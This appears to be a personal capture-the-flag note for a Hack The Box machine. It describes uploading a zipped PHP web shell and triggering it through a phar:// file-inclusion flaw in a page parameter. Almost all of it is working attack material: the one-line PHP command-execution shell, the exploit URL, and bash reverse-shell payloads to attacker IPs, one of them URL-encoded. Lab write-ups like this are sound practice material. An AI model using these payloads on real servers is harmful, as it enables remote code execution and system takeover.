**STEP 1** 
	Create a PHP file(test.php) with below code.
```
	<?php system($_GET["cmd"]); ?>
```

**\STEP 2**
	Create zip of test.php (test.zip)

**STEP 3**
	Upload it and then trigger it with url.
	**Example** : 
	`http://itrc.ssg.htb/?page=phar://uploads/test.zip/test&cmd=whoami`

**STEP 4**
	1. To get reverse shell can replace the `whoami` with `/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'` and doing url encode key character.
	   **Example:**	   `phar://uploads/379a3979995fa3ca58443f88150ec2fb629609fa.zip/test1&cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.81/1111+0>%261'`
	   ![[Pasted image 20240904165018.png]]